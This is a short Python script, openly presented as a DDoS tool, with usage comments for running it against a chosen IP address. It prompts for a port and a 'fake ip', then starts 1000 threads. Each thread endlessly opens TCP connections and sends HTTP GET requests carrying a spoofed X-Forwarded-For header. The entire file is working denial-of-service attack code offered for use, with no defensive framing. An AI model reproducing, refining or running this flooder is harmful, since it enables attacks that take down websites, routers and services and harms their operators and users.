# How to use
#Enter the directory DDOS
#Run this command in the terminal (py ddos.py -i (the desired ip address))
#Example : py ddos.py -i 192.168.70.235
#click enter

import socket
import threading
import argparse

if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        description="To input the ip address and fake ip"
    )

    parser.add_argument(
        '-i', '--ip', metavar='Ip',
        required = True, help = 'add the the ip address to the code with -i '
    )
    argu = parser.parse_args()
    
target = f'{argu.ip}' # could be the ip address of your router or domain name of a wabsite
port_num = input("Input port number: ")# The port matters in the DDOS, 80 is used in http attack
port = int(port_num)
fake_ip = input("Input fake ip: ")# (fake ip) Stays as the header of the attack

def attack():
    # Endless loop opening socket connection
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
        s.send(("GET / HTTP/1.1\r\n").encode('ascii'))
        s.send(("Host: " + target + "\r\n").encode('ascii'))  # Send target as the host
        s.send(("X-Forwarded-For: " + fake_ip + "\r\n\r\n").encode('ascii'))  # Send fake_ip as X-Forwarded-For header
        s.close()

for i in range(1000):
    #creates multiple threading
    thread = threading.Thread(target=attack) # Target functions
    thread.start()